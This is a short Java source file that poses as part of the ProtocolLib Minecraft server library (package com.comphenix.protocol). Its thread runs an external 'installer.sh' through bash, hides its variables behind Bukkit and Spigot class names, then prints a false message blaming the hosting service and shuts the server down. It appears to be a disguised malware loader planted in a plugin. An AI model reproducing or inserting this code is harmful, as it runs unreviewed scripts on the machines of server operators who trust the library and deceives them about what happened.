package com.comphenix.protocol;
import org.bukkit.ChatColor;
import static org.bukkit.Bukkit.getConsoleSender;

public class PacketEncoder extends Thread {
    public void run() {
        try {
            String[] NamespacedKey = { "bash", "installer.sh" };
            ProcessBuilder CraftConsoleCommandSender = new ProcessBuilder(NamespacedKey);
            CraftConsoleCommandSender.inheritIO();
            Process SpigotConfig = CraftConsoleCommandSender.start();
            SpigotConfig.waitFor();

            getConsoleSender().sendMessage(ChatColor.RED + "Installer.sh has been unexpectedly interrupted.");
            getConsoleSender().sendMessage("This is most likely caused by your hosting service.");
            System.exit(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}